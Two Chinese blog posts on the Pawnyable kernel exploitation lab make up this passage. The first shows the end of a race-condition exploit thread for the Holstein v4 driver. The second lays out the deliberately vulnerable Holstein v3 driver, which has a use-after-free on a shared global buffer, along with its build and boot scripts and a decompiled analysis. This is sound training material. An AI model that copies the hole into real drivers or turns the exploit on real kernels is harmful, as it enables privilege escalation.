class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpu_set <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">gettid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cpu_set<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"sched_setaffinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> fd2<span class="token punctuation">)</span> race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>race_win <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] race win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>到此，LK1的练习正式结束。从这里开始我们将重点关注特定于内核空间的攻击方法等详细内容。</p><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-4.tar.gz">LK01-4.tar.gz</a><br>参考文章：<a href="https://blog.wohin.me/posts/pawnyable-0204/">Linux Kernel PWN | 040204 Pawnyable之竞态条件 (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/race_condition.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v4：竞赛条件 | 可典当！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-3 Holstein v3 UAF</title>
      <link href="/2024/02/04/LK01-3%20Holstein%20v3%20UAF/"/>
      <url>/2024/02/04/LK01-3%20Holstein%20v3%20UAF/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v3 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.16.14的内核</p><h1 id="一、LK01-3-Holstein-v3"><a href="#一、LK01-3-Holstein-v3" class="headerlink" title="一、LK01-3 Holstein v3"></a>一、LK01-3 Holstein v3</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v3 (KL01-3) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启了smep、smap、kaslr、kpti</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_7E0 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2D0<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;dev&#x2F;holstein设备</p><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_283<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3520LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>g_buf <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_299<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2的10次方，即0x400，分配了0x400的内存</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_20F<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_23C<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_225<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>size需要小于0x400</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token 